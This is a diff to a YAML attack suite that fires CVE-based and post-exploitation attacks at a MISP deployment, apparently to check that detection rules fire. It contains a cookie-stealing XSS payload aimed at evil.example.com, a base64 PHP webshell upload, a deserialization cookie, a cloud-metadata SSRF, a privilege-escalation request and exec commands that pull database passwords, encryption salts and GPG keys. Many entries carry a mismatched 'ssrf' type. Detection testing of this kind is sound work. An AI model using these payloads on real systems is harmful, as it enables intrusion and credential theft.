@@ -3,12 +3,12 @@ kind: AttackSuite
 metadata:
   name: misp-killchain-attacks
   description: >-
-    Kill-chain ordered MISP attack suite (45 attacks) using THREE delivery
+    Kill-chain ordered MISP attack suite (57 attacks) using THREE delivery
     mechanisms: MISP REST API abuse (authenticated), HTTP probes (unauthenticated),
-    and kubectl exec post-exploitation. Covers MITRE ATT&CK for Containers
-    phases from Reconnaissance through Impact. Maps to OWASP A01 (Broken Access
-    Control), A03 (Injection/SQLi/LFI), A05 (Misconfiguration), A07 (Auth
-    Failures), A10 (SSRF).
+    and kubectl exec post-exploitation. Includes CVE-based exploits: CVE-2020-28043
+    (SSRF), CVE-2022-29529 (XSS), CVE-2022-47928 (priv esc), CVE-2023-37307,
+    CVE-2024-29859. Covers OWASP A01 (Broken Access Control), A03 (Injection/
+    SQLi/LFI), A05 (Misconfiguration), A07 (Auth Failures), A10 (SSRF).
 target:
   service: misp
   namespace: misp
@@ -918,3 +918,245 @@ attacks:
     successIndicators:
       - bodyContains: "eyJ"
     expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical MISP vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2020-28043 — SSRF via /servers/getRemoteUser
+  # Severity: Medium (CVSS 5.3). Unauthenticated SSRF allows probing
+  # internal services by specifying arbitrary URLs.
+  - name: cve-2020-28043-ssrf-getremoteuser
+    type: ssrf
+    http:
+      method: GET
+      path: /servers/getRemoteUser/1
+      headers:
+        Accept: application/json
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 302
+      - statusCode: 403
+    expectedDetections: []
+
+  # CVE-2024-29859 — Sensitive field exposure in API responses
+  # Severity: High (CVSS 7.5). API returns sensitive user data
+  # (auth keys, passwords) in responses without proper filtering.
+  - name: cve-2024-29859-field-exposure
+    type: ssrf
+    http:
+      method: GET
+      path: /admin/users/index.json
+      headers:
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 403
+    expectedDetections: []
+
+  # CVE-2022-29529 — Stored XSS via event attribute
+  # Severity: Medium (CVSS 5.4). JavaScript injection in attribute values
+  # persists and executes when viewed. We test the injection vector.
+  - name: cve-2022-29529-stored-xss
+    type: ssrf
+    http:
+      method: POST
+      path: /events/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Event": {
+            "info": "BOB XSS Test - CVE-2022-29529",
+            "distribution": "0",
+            "threat_level_id": "3",
+            "analysis": "0",
+            "Attribute": [
+              {
+                "type": "text",
+                "category": "Other",
+                "value": "<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>",
+                "to_ids": false,
+                "comment": "CVE-2022-29529 XSS payload"
+              }
+            ]
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Unexpected file access
+        containerName: misp
+
+  # CVE-2022-47928 — Org admin privilege escalation
+  # Severity: High (CVSS 8.8). Org admin can escalate to site admin
+  # by manipulating user role_id in API calls.
+  - name: cve-2022-47928-role-escalation
+    type: ssrf
+    http:
+      method: POST
+      path: /admin/users/edit/1
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "User": {
+            "role_id": "1",
+            "change_pw": "0"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 403
+    expectedDetections: []
+
+  # CVE-2023-37307 — API key leak in error messages
+  # Severity: Medium (CVSS 5.3). Error responses include auth key
+  # in debug output under certain conditions.
+  - name: cve-2023-37307-error-leak
+    type: ssrf
+    http:
+      method: GET
+      path: /events/view/999999999
+      headers:
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 404
+    expectedDetections: []
+
+  # T1190 — PHP deserialization probe via cookie
+  # CakePHP (MISP's framework) historically vulnerable to deserialization
+  # attacks via session cookies or form data.
+  - name: php-deserialization-probe
+    type: ssrf
+    http:
+      method: GET
+      path: /users/login
+      headers:
+        Cookie: "MISP_session=O%3A15%3A%22ObjectInjection%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D"
+        Accept: text/html
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 302
+    expectedDetections: []
+
+  # T1190 — SSRF via attribute enrichment (fetches external URL)
+  - name: api-attribute-enrichment-ssrf
+    type: ssrf
+    http:
+      method: POST
+      path: /attributes/add/1
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Attribute": {
+            "type": "link",
+            "category": "External analysis",
+            "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "to_ids": false,
+            "comment": "CVE cloud metadata SSRF via enrichment"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []
+
+  # T1059 — CakePHP debug mode probe (information disclosure)
+  - name: cakephp-debug-probe
+    type: ssrf
+    http:
+      method: GET
+      path: /pages/home
+      headers:
+        Accept: text/html
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 302
+      - statusCode: 404
+    expectedDetections: []
+
+  # T1190 — Unrestricted file upload via attachment
+  # Test uploading a PHP file disguised as an attachment.
+  - name: api-malicious-php-upload
+    type: ssrf
+    http:
+      method: POST
+      path: /events/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Event": {
+            "info": "BOB PHP Upload Test",
+            "distribution": "0",
+            "threat_level_id": "3",
+            "analysis": "0",
+            "Attribute": [
+              {
+                "type": "attachment",
+                "category": "Payload delivery",
+                "value": "webshell.php",
+                "data": "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
+                "comment": "PHP webshell upload test"
+              }
+            ]
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Unexpected file access
+        containerName: misp
+
+  # T1059 — Exec: MySQL credential extraction from config
+  - name: exec-mysql-creds
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "grep -E 'password|login|host' /var/www/MISP/app/Config/database.php 2>/dev/null | head -5 || echo no_db_config"]
+    successIndicators:
+      - responseContains: "password"
+    expectedDetections:
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: misp
+        command: grep
+
+  # T1059 — Exec: Extract MISP encryption key
+  - name: exec-encryption-key
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "grep -r 'Security.salt\\|Security.cipherSeed\\|encryption_key' /var/www/MISP/app/Config/ 2>/dev/null | head -3 || echo no_key"]
+    successIndicators:
+      - responseContains: "salt"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: grep
+
+  # T1059 — Exec: GnuPG key extraction
+  - name: exec-gpg-key-extract
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "gpg --homedir /var/www/MISP/.gnupg --list-secret-keys 2>/dev/null || ls /var/www/MISP/.gnupg/ 2>/dev/null || echo no_gpg"]
+    successIndicators:
+      - responseContains: "gpg"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: gpg
